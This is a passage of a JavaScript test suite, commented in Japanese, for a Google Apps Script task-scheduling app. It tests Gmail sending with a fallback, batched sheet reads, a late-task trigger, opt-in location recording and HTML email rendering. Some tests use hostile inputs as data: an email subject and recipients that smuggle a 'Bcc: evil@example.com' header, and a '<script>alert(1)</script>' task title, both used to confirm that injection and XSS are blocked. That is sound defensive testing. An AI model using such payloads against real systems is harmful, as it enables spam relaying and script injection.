  ok('件名・文字だけの本文・HTML の本文が、読み解くと元どおりになる', m0.subject === 'Scurrop | 訪問サービス のボードに参加しますか？' && /参加する：\nhttps:\/\/script\.google\.com\/macros\/s\//.test(m0.body) && /のボードに参加しますか？/.test(m0.options.htmlBody) && m0.options.htmlBody.includes('>参加する</a>'));
  ok('送り主は書かない（Gmail が本人のアドレスを入れる）。Bcc なども付かない', !/^(From|Bcc|Cc|Reply-To|Sender):/im.test(m0.raw.split('\r\n\r\n')[0]));
  ok('メールの見出しの 1 行は 76 文字以内', m0.raw.split('\r\n\r\n')[0].split('\r\n').every(l => l.length <= 76 || /^Content-Type: multipart/.test(l)));
  ok('管理者には、Gmail で送れていることが見える', a18.getState().mailVia === 'gmail' && a18.getState().mailWhy === '');
  // 別の読み手（Python の標準の email）でも同じに読める
  const py = require('child_process').spawnSync('python3', ['-I', '-c', 'import sys,json,email\nfrom email import policy\nm=email.message_from_bytes(sys.stdin.buffer.read(),policy=policy.default)\nprint(json.dumps({"to":str(m["To"]),"subject":str(m["Subject"]),"plain":m.get_body(("plain",)).get_content(),"html":m.get_body(("html",)).get_content(),"defects":len(m.defects)}))'], { input: m0.raw });
  if (py.status === 0) {
    const pm = JSON.parse(String(py.stdout));
    ok('別の読み手（Python の email）で読んでも、あて先・件名・本文が同じで、欠陥がない', pm.to === 'guest@gmail.com' && pm.subject === m0.subject && pm.plain.trim() === m0.body.trim() && pm.html.trim() === m0.options.htmlBody.trim() && pm.defects === 0);
  } else { console.log('SKIP python3 がないので、別の読み手での確認は飛ばす'); }
  // 件名からメールの見出しを足せない
  const evil = e18.mime('a@b.com', 'x\r\nBcc: evil@example.com', '本文');
  ok('件名に改行を入れても、メールの見出しは足せない', !/^Bcc:/m.test(evil) && evil.split('\r\n\r\n')[0].split('\r\n').filter(l => /^[A-Za-z-]+:/.test(l)).map(l => l.split(':')[0]).join() === 'To,Subject,MIME-Version,Content-Type,Content-Transfer-Encoding');
  throws('あて先に余計なもの（カンマや改行）が入っていたら送らない', () => e18.mail('a@b.com,evil@example.com', 'x', 'y'), /アドレスが正しくありません/);
  throws('あて先に改行が入っていたら送らない', () => e18.mail('a@b.com\r\nBcc: evil@example.com', 'x', 'y'), /アドレスが正しくありません/);
  ok('絵文字や長い件名でも、読み解くと元どおり', (() => { const subj = '開始: 🐹 とても長い名前のタスク'.repeat(6) + ' 9:00–10:00（佐藤 美咲）'; e18.mails.length = 0; e18.mail('a@b.com', subj, '本文\n2 行目'); return e18.mails[0].subject === subj && e18.mails[0].body === '本文\n2 行目' && e18.mails[0].options === null; })());
  // Gmail が使えないとき（API が有効になっていない、など）は、予備の送り方で送る
  e18.gmailFail = true; e18.mails.length = 0;
  r = a18.resendInvite('guest@gmail.com');
  ok('Gmail で送れないときは、予備の送り方で送り、理由を覚えておく', e18.mails.length === 1 && e18.mails[0].via === 'mailapp' && /予備の方法で送信しました/.test(r.notice) && r.mailVia === 'mailapp' && /Gmail API has not been used/.test(r.mailWhy) && !!e18.mails[0].options.htmlBody);
  let tm = a18.testMail();
  ok('メールの確認は、どちらの送り方で送ったかと、Gmail で送れなかった理由を返す', tm.ok === true && tm.via === 'mailapp' && /Gmail API/.test(tm.why));
  e18.gmailFail = false; e18.noGmail = true; e18.mails.length = 0;
  tm = a18.testMail();
  ok('Gmail のサービスが入っていないときも、予備の送り方で送る', tm.ok === true && tm.via === 'mailapp' && /サービスが有効になっていません/.test(tm.why) && e18.mails[0].via === 'mailapp');
  e18.noGmail = false;
  tm = a18.testMail();
  ok('Gmail が使えるようになれば Gmail で送り、理由は消える', tm.via === 'gmail' && tm.why === '' && a18.getState().mailVia === 'gmail' && a18.getState().mailWhy === '');
  // 承認がまだのとき（権限を足した直後）
  e18.needAuth = true; e18.mails.length = 0;
  r = a18.resendInvite('guest@gmail.com');
  ok('承認がまだのときは、予備の送り方で送り、その場で知らせる（「未送信」の印は付けない）', e18.mails.length === 1 && e18.mails[0].via === 'mailapp' && /予備の方法で送信しました/.test(r.notice) && r.invited.filter(m => m.email === 'guest@gmail.com')[0].error === '');
  ok('理由は「承認が必要」と出る', r.mailVia === 'mailapp' && /承認が必要です（エディタで authorize を実行）/.test(r.mailWhy));
  e18.mails.length = 0; e18.prompted = 0;
  throws('authorize は、足りない承認があれば、承認の画面を出して止まる', () => a18.authorize(), /Authorization is required/);
  ok('承認の画面は 1 回出て、メールは送られない', e18.prompted === 1 && e18.mails.length === 0);
  e18.needAuth = false;
  let line = a18.authorize();
  ok('承認したあとの authorize は、Gmail から自分あてに 1 通送って、結果を返す', /^ok: Gmail から admin@example\.com に送信しました \/ 監視: ok（5 分間隔）$/.test(line) && e18.mails.length === 1 && e18.mails[0].via === 'gmail' && e18.mails[0].to === 'admin@example.com' && a18.getState().mailVia === 'gmail');
  r = a18.resendInvite('guest@gmail.com');
  ok('Gmail で送れたときは、知らせは出ない', r.notice === '' && e18.mails[e18.mails.length - 1].via === 'gmail');
  e18.gmailFail = true; e18.mails.length = 0;
  line = a18.authorize();
  ok('authorize は、Gmail で送れないときに予備の送り方を使わず、理由をそのまま返す', /^Gmail で送信できません: Gmail API has not been used/.test(line) && e18.mails.length === 0);
  e18.gmailFail = false; e18.noGmail = true;
  ok('authorize は、Gmail のサービスが入っていないときも、そう返す', /Gmail  サービスが有効になっていません/.test(a18.authorize()));
  e18.noGmail = false;
  e18.user = 'someone@example.com';
  throws('authorize は、公開した本人でなければ使えない（同じ組織の人でも）', () => a18.authorize(), /デプロイしたアカウント/);
  e18.user = '';
  throws('authorize は、ログインしていない人には使えない', () => a18.authorize(), /デプロイしたアカウント/);
  ok('使えなかった authorize では、メールは送られない', e18.mails.length === 0);
  e18.user = 'admin@example.com';
  // ルールとリンクの通知も Gmail から
  e18.mails.length = 0; a18.resendInvite('guest@gmail.com');
  const k18 = (e18.mails[0].body.match(/[?&]k=([A-Za-z0-9._-]+)/) || [])[1];
  e18.user = ''; a18.joinProject({ key: k18, name: '外の人' }); e18.user = 'admin@example.com';
  e18.mails.length = 0;
  const ta = a18.createTask({ title: '訪問 A', member: 'guest@gmail.com', start: at(9), end: at(10) }).tasks.filter(t => t.title === '訪問 A')[0];
  const tb = a18.createTask({ title: '訪問 B', member: 'admin@example.com', start: at(10), end: at(11) }).tasks.filter(t => t.title === '訪問 B')[0];
  a18.linkTasks(ta.id, tb.id, '', true);
  ok('リンクの通知も Gmail から送る', e18.mails.length >= 2 && e18.mails.every(m => m.via === 'gmail') && e18.mails.some(m => m.to === 'guest@gmail.com' && /タスクがリンクされました: 訪問 A/.test(m.subject)));
  e18.user = '';
  ok('メンバーには、メールの送り方は渡らない', (() => { const st = a18.getState({ key: k18 }); return st.mailVia === '' && st.mailWhy === ''; })());
}

// 計測（どこに時間がかかったかを、数字だけで返す）
{
  const e19 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a19 = e19.api; e19.now = at(8);
  a19.initProject({ name: '訪問サービス' });
  a19.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a19.createTask({ title: '秘密のタスク', member: 'sato@example.com', start: at(9), end: at(10), memo: '暗証番号 1234' });
  const c = a19.getState().clock;
  const parts = {}; c.split(' ').forEach(x => { const p = x.split(':'); parts[p[0]] = { n: Number(p[1]), ms: Number(p[2]) }; });
  ok('計測は「名前:回数:ミリ秒」の並びで、数字のほかは入らない', /^([a-z]+:\d+:\d+)( [a-z]+:\d+:\d+)*$/.test(c) && !/秘密|暗証|example|sato/.test(c));
  ok('設定は 1 回、シートはまとめて 1 回で読み、スプレッドシートを開かない', parts.props.n === 1 && parts.batch.n === 1 && !parts.open && !parts.read && !parts.sheet);
  ok('まとめ読みが使えないときの計測の「読む」の回数は、実際にシートを読んだ回数と合う', (() => { e19.noSheets = true; e19.reads.sheets = 0; const st = a19.getState(); e19.noSheets = false; const n = Number((st.clock.match(/read:(\d+)/) || [])[1]); return n >= e19.reads.sheets && e19.reads.sheets > 0 && !/batch/.test(st.clock); })());
  e19.user = 'sato@example.com';
  ok('メンバーにも計測は返る（数字だけ）', /^([a-z]+:\d+:\d+)( [a-z]+:\d+:\d+)*$/.test(a19.getState().clock));
  e19.user = 'someone@gmail.com';
  ok('登録のない人に返る計測にも、数字のほかは入らない', /^([a-z]+:\d+:\d+)( [a-z]+:\d+:\d+)*$/.test(a19.getState().clock));
}

// まとめ読み（2026-11-14 の実機: シート 1 枚に約 0.33 秒、9〜10 回で 3 秒超。1 回の呼び出しにまとめる）
{
  const e20 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a20 = e20.api; e20.now = at(8);
  a20.initProject({ name: '訪問サービス' });
  a20.addBoard({ name: '東', color: '#2279B6' });
  a20.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '東' });
  a20.addMember({ email: 'takahashi@example.com', name: '高橋 健', board: '' });
  e20.autoJoin = false; a20.addMember({ email: 'guest@gmail.com', name: '外の人', board: '' });
  const k20 = (e20.mails[e20.mails.length - 1].body.match(/[?&]k=([A-Za-z0-9._-]+)/) || [])[1];
  e20.user = ''; a20.joinProject({ key: k20, name: '外の人' }); e20.user = 'admin@example.com';
  a20.addMember({ email: 'wait@gmail.com', name: '招待中', board: '' });
  a20.saveTemplate({ name: '訪問', board: '東', minutes: 45, fields: [{ label: '人数', type: 'number' }] });
  const t1 = a20.createTask({ title: '訪問 A', member: 'sato@example.com', start: at(9), end: at(10), memo: 'メモ', address: '東京都' }).tasks.filter(t => t.title === '訪問 A')[0];
  const t2 = a20.createTask({ title: '訪問 B', member: 'guest@gmail.com', start: at(10), end: at(11) }).tasks.filter(t => t.title === '訪問 B')[0];
  a20.createTask({ title: '未割り当て', member: '', start: at(12), end: at(13) });
  a20.linkTasks(t1.id, t2.id, '引き継ぎ', false);
  a20.saveShift({ member: 'sato@example.com', date: todayText, start: '09:00', end: '17:00', repeat: 'weekly', days: [day.getDay()] });
  a20.addRule({ when: 'start', then: ['notify_admin'] });
  const strip = (st) => { const o = JSON.parse(JSON.stringify(st)); delete o.tookMs; delete o.clock; delete o.now; delete o.readWhy; return JSON.stringify(o); };
  const both = (fn) => { e20.noSheets = false; const a = fn(); e20.noSheets = true; const b = fn(); e20.noSheets = false; return [a, b]; };
  const z = () => { e20.reads.sheets = 0; e20.reads.open = 0; e20.reads.batch = 0; e20.reads.props = 0; };
  z(); let st = a20.getState();
  ok('管理者の画面: シートを 1 回の呼び出しでまとめて読み、1 枚ずつは読まない（スプレッドシートも開かない）', e20.reads.batch === 1 && e20.reads.sheets === 0 && e20.reads.open === 0 && e20.reads.props === 1 && st.tasks.length === 3 && st.readWhy === '');
  let pair = both(() => strip(a20.getState()));
  ok('管理者の画面: まとめ読みでも、1 枚ずつ読んでも、返るものは同じ', pair[0] === pair[1] && JSON.parse(pair[0]).history.length > 5 && JSON.parse(pair[0]).invited.length === 1 && JSON.parse(pair[0]).links.length === 1 && JSON.parse(pair[0]).shifts.length >= 1);
  pair = both(() => strip(a20.getState({ week: true })));
  ok('週の表示でも同じ', pair[0] === pair[1]);
  e20.user = 'sato@example.com';
  z(); st = a20.getState();
  ok('メンバーの画面も 1 回の呼び出しで読む', e20.reads.batch === 1 && e20.reads.sheets === 0 && e20.reads.open === 0 && st.tasks.length === 1 && st.readWhy === '');
  pair = both(() => strip(a20.getState()));
  ok('メンバーの画面: どちらの読み方でも、返るものは同じ', pair[0] === pair[1]);
  e20.user = '';
  a20.getState({ key: k20 }); z(); st = a20.getState({ key: k20 }); // 1 回目で、鍵の番号の一覧を覚える
  ok('鍵で入ったメンバーの画面も 1 回の呼び出しで読む', e20.reads.batch === 1 && e20.reads.sheets === 0 && e20.reads.open === 0 && st.me.role === 'member' && st.tasks.length === 1);
  pair = both(() => strip(a20.getState({ key: k20 })));
  ok('鍵で入ったメンバーの画面: どちらの読み方でも同じ', pair[0] === pair[1]);
  z(); const pg = a20.doGet({ parameter: { k: k20 } });
  ok('最初のページも、メンバーの確認を 1 回の呼び出しで済ませる', e20.reads.batch === 1 && e20.reads.sheets === 0 && e20.reads.open === 0 && /訪問サービス/.test(pg.title));
  // 書いた直後の読み直し
  z(); st = a20.updateTask(t2.id, 'start', { key: k20 });
  ok('操作（開始）のあとに返る状態は、書いた結果を映している', st.tasks.filter(t => t.id === t2.id)[0].status === 'active' && st.history.some(h => h.action === 'start'));
  ok('操作のなかで触ったシートは 1 枚ずつ読み直し、触っていないシートだけをまとめて読む', e20.reads.batch === 1 && e20.reads.sheets > 0 && !e20.batchRanges.includes('tasks') && !e20.batchRanges.some(r => /^history/.test(r)) && e20.batchRanges.includes('boards'));
  e20.user = 'admin@example.com';
  st = a20.editTask(t1.id, { title: '訪問 A2', member: 'sato@example.com', start: at(9), end: at(10), memo: 'メモ', address: '東京都' });
  ok('管理者の操作（変更）のあとも、書いた結果を映している', st.tasks.some(t => t.title === '訪問 A2') && !st.tasks.some(t => t.title === '訪問 A'));
  // スプレッドシートを手で書き換えたとき
  e20.sheets.boards._d.push(['手で足したボード', '#5271C7', 9]);
  e20.sheets.members._d.filter(r => r[0] === 'takahashi@example.com')[0][1] = '高橋（手で変更）';
  st = a20.getState();
  ok('スプレッドシートを手で書き換えた内容は、次に開いたときに映る', st.boards.some(b => b.name === '手で足したボード') && st.members.some(m => m.name === '高橋（手で変更）'));
  e20.sheets.tasks._d.push([]); e20.sheets.tasks._d.push(['', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '']);
  pair = both(() => strip(a20.getState()));
  ok('空の行が混じっていても、どちらの読み方でも同じ', pair[0] === pair[1]);
  e20.sheets.tasks._d.length -= 2;
  // まとめ読みが使えないとき
  e20.batchFail = true; z();
  st = a20.getState();
  ok('まとめ読みが失敗したら、1 枚ずつ読んで同じものを返し、管理者には理由が見える', e20.reads.sheets > 0 && strip(st) === strip((e20.batchFail = false, a20.getState())) && /Google Sheets API has not been used/.test(st.readWhy));
  e20.batchFail = true; e20.user = 'sato@example.com';
  ok('まとめ読みが失敗した理由は、メンバーには渡らない', a20.getState().readWhy === '' && a20.getState().tasks.length === 1);
  e20.batchFail = false; e20.user = 'admin@example.com'; e20.noSheets = true;
  ok('Sheets のサービスが入っていないときも、1 枚ずつ読んで動く', a20.getState().tasks.length === 3 && /サービスが有効になっていません/.test(a20.getState().readWhy));
  e20.noSheets = false;
  // シートが 1 枚欠けているとき（古い版から更新した直後など）
  const keep = e20.sheets.links; delete e20.sheets.links;
  st = a20.getState();
  ok('シートが 1 枚欠けていても止まらない（その分は空として扱う）', st.tasks.length === 3 && st.links.length === 0);
  e20.sheets.links = keep;
  // 履歴は最後の数百行だけを読む
  const hd = e20.sheets.history._d; const row0 = hd[hd.length - 1].slice();
  for (let i = 0; i < 900; i++) { const r = row0.slice(); r[0] = at(8) + i; r[5] = '古い記録 ' + i; hd.push(r); }
  a20.getState(); // 1 回目で行数を覚える
  const n1 = Number(e20.props.HIST_N);
  ok('履歴の行数を覚える', n1 === hd.length);
  z(); st = a20.getState();
  const hr = e20.batchRanges.filter(r => /^history!A\d+:/.test(r) && !/^history!A1:/.test(r))[0];
  ok('2 回目からは、履歴の最後の 600 行だけを頼む', hr === 'history!A' + (n1 - 600 + 1) + ':I' && e20.reads.batch === 1 && e20.reads.sheets === 0);
  pair = both(() => strip(a20.getState()));
  ok('履歴が長くても、どちらの読み方でも返るものは同じ', pair[0] === pair[1] && JSON.parse(pair[0]).history.length === 60 && JSON.parse(pair[0]).history[0].note === '古い記録 899');
  for (let i = 0; i < 50; i++) { const r = row0.slice(); r[0] = at(8) + 1000 + i; r[5] = '新しい記録 ' + i; hd.push(r); }
  st = a20.getState();
  ok('行数を覚え直す前に履歴が増えても、最新の記録が出る（覚えた行数は、ずれが大きくなるまで書き換えない）', st.history[0].note === '新しい記録 49' && Number(e20.props.HIST_N) === n1);
  for (let i = 0; i < 60; i++) { const r = row0.slice(); r[0] = at(8) + 2000 + i; r[5] = 'さらに新しい記録 ' + i; hd.push(r); }
  st = a20.getState();
  ok('ずれが 100 行を超えたら、行数を覚え直す', st.history[0].note === 'さらに新しい記録 59' && Number(e20.props.HIST_N) === hd.length);
  // 履歴を手で消して、覚えた行数より少なくなったとき
  hd.length = 20; z();
  st = a20.getState();
  ok('履歴を手で消したあとも、残っている記録が出る（その回は 1 枚ずつ読み、行数は数え直す）', st.history.length > 0 && st.history.length <= 19 && e20.props.HIST_N === undefined && e20.reads.sheets > 0);
  z(); st = a20.getState();
  ok('次の回からは、またまとめて読む', e20.reads.batch === 1 && e20.reads.sheets === 0 && Number(e20.props.HIST_N) === 20 && st.history.length > 0);
  e20.props.HIST_N = '5000';
  st = a20.getState();
  ok('覚えた行数がシートの外を指していても止まらず、数え直す', st.tasks.length === 3 && st.history.length > 0 && e20.props.HIST_N === undefined && /exceeds grid limits/.test(st.readWhy));
  st = a20.getState();
  ok('数え直したあとは、理由も消える', st.readWhy === '' && Number(e20.props.HIST_N) === 20);
  // リセット
  a20.resetProject();
  ok('リセットすると、覚えた行数も消える', e20.props.HIST_N === undefined && a20.getState().setup === true);
}

// 見張り（画面を開いていなくても、遅延のルールを動かす）
{
  const e21 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a21 = e21.api; e21.now = at(8);
  a21.initProject({ name: '訪問サービス' });
  a21.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a21.doGet({ parameter: {} });
  let st = a21.getState();
  ok('遅延のルールがオン（初期の設定）なら、管理者が開いたときに 5 分おきの見張りが置かれる', e21.triggers.length === 1 && e21.triggers[0].fn === 'tick' && e21.triggers[0].minutes === 5 && st.tick.want && st.tick.on && st.tick.why === '' && e21.props.TICK_ID === e21.triggers[0].uid);
  a21.getState(); a21.getState();
  ok('何度開いても、見張りは 1 つだけ', e21.triggers.length === 1);
  const t1 = a21.createTask({ title: '訪問 A', member: 'sato@example.com', start: at(9), end: at(10) }).tasks.filter(t => t.title === '訪問 A')[0];
  // だれも画面を開いていない
  e21.user = ''; e21.mails.length = 0;
  e21.now = at(9, 5);
  ok('5 分の遅れでは、見張りが動いても知らせない', e21.runTick().join() === 'ok' && e21.mails.length === 0);
  e21.now = at(9, 11); const sheetReads = e21.reads.sheets;
  ok('だれも画面を開いていなくても、10 分を超えた遅れを見張りが見つけて、メンバーと管理者に知らせる', e21.runTick().join() === 'fired' && e21.mails.length === 2 && e21.mails.map(m => m.to).sort().join() === 'admin@example.com,sato@example.com' && e21.mails.every(m => m.via === 'gmail' && /開始の遅延: 訪問 A/.test(m.subject)));
  ok('見張りからのメールにも、タスクを開くリンクが入る（ページを開いたときに覚えた URL）', e21.mails.every(m => /タスクを開く: https:\/\/script\.google\.com\/a\/macros\/example\.com\/s\/TEST\/exec\?task=/.test(m.body)));
  e21.now = at(9, 16); e21.mails.length = 0;
  ok('同じ遅れを、次の見張りでもう一度は知らせない', e21.runTick().join() === 'ok' && e21.mails.length === 0);
  ok('見張りが最後に動いた時刻を覚える', Number(e21.props.TICK_LAST) === at(9, 16));
  // 画面から呼ばれても動かない
  e21.user = 'someone@gmail.com'; e21.now = at(9, 30);
  const t2row = e21.sheets.tasks._d.length;
  ok('見張りの入口は、置いたトリガー本人からでなければ何もしない（引数なし・でたらめな番号・昔の番号）', a21.tick() === 'skip' && a21.tick({}) === 'skip' && a21.tick({ triggerUid: 'trg999' }) === 'skip' && a21.tick({ triggerUid: '' }) === 'skip' && Number(e21.props.TICK_LAST) === at(9, 16) && e21.sheets.tasks._d.length === t2row);
  e21.user = 'admin@example.com';
  st = a21.getState();
  ok('管理者には、見張りの様子が見える', st.tick.on && st.tick.last === at(9, 16) && st.tick.minutes === 5);
  e21.user = 'sato@example.com';
  ok('メンバーには、見張りの様子は渡らない', a21.getState().tick === null);
  e21.user = 'admin@example.com';
  // ルールをオフにしたら外す
  const late = st.rules.filter(r => r.when === 'late')[0];
  st = a21.setRule(late.id, false);
  ok('遅延のルールをオフにすると、見張りを外す', e21.triggers.length === 0 && e21.props.TICK_ID === undefined && st.tick.want === false && !st.notice);
  st = a21.setRule(late.id, true);
  ok('オンに戻すと、見張りを置き直す', e21.triggers.length === 1 && st.tick.on && !st.notice);
  // 止まっていそうなとき（手で消された）
  e21.triggers.length = 0; e21.now = at(9, 40);
  st = a21.getState();
  ok('置いたばかりなら、置き直さない', e21.triggers.length === 0);
  e21.now = at(10, 15);
  st = a21.getState();
  ok('見張りが 20 分より長く動いていなければ、置き直す', e21.triggers.length === 1 && st.tick.on && e21.props.TICK_ID === e21.triggers[0].uid);
  // 承認がまだのとき
  e21.triggers.length = 0; delete e21.props.TICK_ID; delete e21.props.TICK_SET; e21.needAuth = true;
  st = a21.getState();
  ok('承認がまだなら見張りは置けず、理由が管理者に見える', e21.triggers.length === 0 && st.tick.want && !st.tick.on && /承認が必要です（エディタで authorize を実行）/.test(st.tick.why));
  st = a21.setRule(late.id, true);
  ok('そのとき遅延のルールをオンにすると、その場で知らせる', /遅延の通知は、現在、画面を開いている間のみ動作します（承認が必要です/.test(st.notice));
  const other = st.rules.filter(r => r.when === 'start')[0];
  ok('ほかのルールを切り替えたときは、知らせない', !a21.setRule(other.id, true).notice);
  e21.needAuth = false;
  st = a21.getState();
  ok('承認しただけでは、置き直さない（15 秒おきに同じことを試さない）', e21.triggers.length === 0 && !st.tick.on);
  const line = a21.authorize();
  ok('authorize を実行すると、見張りが置かれる', e21.triggers.length === 1 && /監視: ok（5 分間隔）/.test(line) && a21.getState().tick.on && a21.getState().tick.why === '');
  // 画面を開いているあいだの遅延の検知は、これまでどおり
  const t3 = a21.createTask({ title: '訪問 C', member: 'sato@example.com', start: at(11), end: at(12) }).tasks.filter(t => t.title === '訪問 C')[0];
  e21.now = at(11, 11); e21.mails.length = 0;
  a21.getState();
  ok('管理者が画面を開いているときは、これまでどおり、その場でも遅延を見つける', e21.mails.length === 2);
  ok('そのあとに見張りが動いても、二重には知らせない', e21.runTick().join() === 'ok' && e21.mails.length === 2);
  // リセット
  a21.resetProject();
  ok('リセットすると、見張りも外れる', e21.triggers.length === 0 && e21.props.TICK_ID === undefined);
}

/** いまのシートの版（Code.gs の SCHEMA）。版が上がるたびにテストを書き換えなくて済むように、コードから読む。 */
const SCHEMA_NOW = (/const SCHEMA = '(\d+)';/.exec(require('fs').readFileSync(process.argv[2] || __dirname + '/../src/Code.gs', 'utf8')) || [])[1];

// 位置情報の記録は、タスクごとに決める（どのタスクでも位置を取るのは、監視アプリのようになる）
{
  const e22 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a22 = e22.api; e22.now = at(8);
  a22.initProject({ name: '訪問サービス' });
  a22.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  const col = (name) => e22.sheets.tasks._d[0].indexOf(name);
  const hcol = (name) => e22.sheets.history._d[0].indexOf(name);
  const lastH = () => e22.sheets.history._d[e22.sheets.history._d.length - 1];
  let st = a22.createTask({ title: 'オフ', member: 'sato@example.com', start: at(9), end: at(10) });
  const off = st.tasks.filter(t => t.title === 'オフ')[0];
  ok('何も指定しなければ、位置情報は記録しない', off.geo === false);
  st = a22.createTask({ title: 'オン', member: 'sato@example.com', start: at(10), end: at(11), geo: true });
  const on = st.tasks.filter(t => t.title === 'オン')[0];
  ok('タスクを作るときに、位置情報の記録をオンにできる', on.geo === true && st.tasks.filter(t => t.title === 'オフ')[0].geo === false);
  ok('true 以外の値（文字の "true" など）では、オンにならない', a22.createTask({ title: '文字', member: '', start: at(12), end: at(13), geo: 'true' }).tasks.filter(t => t.title === '文字')[0].geo === false);
  e22.user = 'sato@example.com';
  st = a22.getState();
  ok('メンバーにも、そのタスクが位置情報を記録するかが届く', st.tasks.filter(t => t.id === on.id)[0].geo === true && st.tasks.filter(t => t.id === off.id)[0].geo === false);
  st = a22.updateTask(off.id, 'start', { geo: { lat: 35.63, lng: 139.73, acc: 18 } });
  ok('オフのタスクでは、位置情報が送られてきても残さない（履歴にもシートにも）', st.tasks.filter(t => t.id === off.id)[0].status === 'active' && !st.history.filter(h => h.task === off.id && h.action === 'start')[0].hasGeo && lastH()[hcol('lat')] === '' && lastH()[hcol('lng')] === '' && lastH()[hcol('accuracy_m')] === '');
  st = a22.updateTask(off.id, 'done', { geoError: 'User denied Geolocation' });
  ok('オフのタスクでは、「位置: 取得できず」も残さない', !/位置/.test(st.history.filter(h => h.task === off.id && h.action === 'done')[0].note));
  st = a22.updateTask(on.id, 'start', { geo: { lat: 35.63, lng: 139.73, acc: 18 } });
  ok('オンのタスクでは、位置情報を記録する', st.history.filter(h => h.task === on.id && h.action === 'start')[0].hasGeo && lastH()[hcol('lat')] === 35.63);
  e22.user = 'admin@example.com';
  // 変更
  const ev0 = e22.events.length;
  st = a22.createTask({ title: '変更用', member: 'sato@example.com', start: at(13), end: at(14) });
  const ed = st.tasks.filter(t => t.title === '変更用')[0];
  const evN = e22.events.length;
  st = a22.editTask(ed.id, { title: '変更用', member: 'sato@example.com', start: at(13), end: at(14), memo: '', address: '', geo: true });
  ok('あとから位置情報の記録をオンにできる。履歴に残る', st.tasks.filter(t => t.id === ed.id)[0].geo === true && st.history.some(h => h.task === ed.id && h.action === 'edit' && /位置情報の記録をオン/.test(h.note)));
  ok('位置情報の記録を変えただけでは、カレンダーの予定を作り直さない', e22.events.length === evN && st.tasks.filter(t => t.id === ed.id)[0].hasEvent);
  st = a22.editTask(ed.id, { title: '変更用', member: 'sato@example.com', start: at(13, 30), end: at(14, 30), memo: '', address: '' });
  ok('位置情報を指定しない変更（ドラッグなど）では、オンのまま', st.tasks.filter(t => t.id === ed.id)[0].geo === true && !/位置情報/.test(st.history.filter(h => h.task === ed.id && h.action === 'edit')[0].note));
  st = a22.editTask(ed.id, { title: '変更用', member: 'sato@example.com', start: at(13, 30), end: at(14, 30), memo: '', address: '', geo: false });
  ok('オフに戻せる', st.tasks.filter(t => t.id === ed.id)[0].geo === false && /位置情報の記録をオフ/.test(st.history.filter(h => h.task === ed.id && h.action === 'edit')[0].note));
  e22.user = 'sato@example.com';
  throws('メンバーは、位置情報の記録を自分では変えられない', () => a22.editTask(ed.id, { title: '変更用', member: 'sato@example.com', start: at(13, 30), end: at(14, 30), geo: true }), /管理者/);
  e22.user = 'admin@example.com';
  // 前の版のシート（geo の列がない）
  const e23 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a23 = e23.api; e23.now = at(8);
  a23.initProject({ name: '前の版' });
  a23.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a23.createTask({ title: '前の版のタスク', member: 'sato@example.com', start: at(9), end: at(10) });
  const d = e23.sheets.tasks._d; const gi = d[0].indexOf('geo'); d.forEach(r => r.splice(gi, 1)); e23.props.SCHEMA = '9';
  st = a23.getState();
  ok('前の版のシートには、開いたときに列が足され、前からあるタスクは「記録しない」になる', e23.sheets.tasks._d[0].indexOf('geo') >= 0 && e23.props.SCHEMA === SCHEMA_NOW && st.tasks[0].geo === false);
  e23.user = 'sato@example.com';
  st = a23.updateTask(st.tasks[0].id, 'start', { geo: { lat: 1, lng: 2, acc: 3 } });
  ok('前からあるタスクでは、位置情報を残さない', !st.history.filter(h => h.action === 'start')[0].hasGeo);
}

// お知らせのメールの見た目（遅延のメールも、招待と同じ「Scurrop からのお知らせ」の形に）
{
  const e24 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a24 = e24.api; e24.now = at(8);
  a24.initProject({ name: 'サンプル <b>' });
  a24.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a24.addMember({ email: 'takahashi@example.com', name: '高橋 健', board: '' });
  a24.doGet({ parameter: {} }); a24.getState();
  const t1 = a24.createTask({ title: '訪問 <script>alert(1)</script>', member: 'sato@example.com', start: at(9), end: at(10), memo: '1 行目\n2 行目 <i>x</i>', address: '東京都 "港区"' }).tasks[0];
  e24.user = ''; e24.now = at(9, 11); e24.mails.length = 0;
  e24.runTick();
  const lm = e24.mails.filter(m => m.to === 'sato@example.com')[0];
  const html = lm && lm.options ? lm.options.htmlBody : '';
  const link = lm ? (lm.body.match(/https:\S+/) || [''])[0] : '';
  ok('遅延のお知らせは、文字だけのメールと HTML のメールの両方で届く', e24.mails.length === 2 && e24.mails.every(m => m.via === 'gmail' && m.options && m.options.htmlBody) && /開始の遅延: 訪問/.test(lm.subject) && /タスクを開く: https:/.test(lm.body));
  ok('HTML には、Scurrop とプロジェクト名、何のお知らせか、タスク名、時間とメンバーが入る', />Scurrop<span[^>]*> \| サンプル &lt;b&gt;<\/span>/.test(html) && />開始の遅延<\/span>/.test(html) && /9:00–10:00 · 佐藤 美咲/.test(html));
  ok('遅延の印は赤、ボタンは「タスクを開く」で、リンクは文字だけのメールと同じ', /background:#FF3B30[^>]*>開始の遅延</.test(html) && html.includes('href="' + link.replace(/&/g, '&amp;') + '"') && />タスクを開く<\/a>/.test(html) && /\?task=/.test(link));
  ok('住所とメモが入り、メモの改行は改行のまま出る', />住所</.test(html) && /東京都 &quot;港区&quot;/.test(html) && />メモ</.test(html) && /1 行目<br>2 行目 &lt;i&gt;x&lt;\/i&gt;/.test(html));
  ok('タスク名やプロジェクト名に「<」などが入っていても、HTML では文字として出る', !/<script>/.test(html) && /訪問 &lt;script&gt;alert\(1\)&lt;\/script&gt;/.test(html) && !/<b>/.test(html) && !/<i>x/.test(html));
  ok('画像は付けない。外の場所から読み込むものもない', !/<img|src=|url\(/i.test(html));
  // 住所もメモもないタスク
  e24.user = 'admin@example.com'; e24.now = at(9, 20);
  const st = a24.getState();
  a24.setRule(st.rules.filter(r => r.when === 'start')[0].id, true);
  const t2 = a24.createTask({ title: '点検', member: 'takahashi@example.com', start: at(10), end: at(11) }).tasks.filter(t => t.title === '点検')[0];
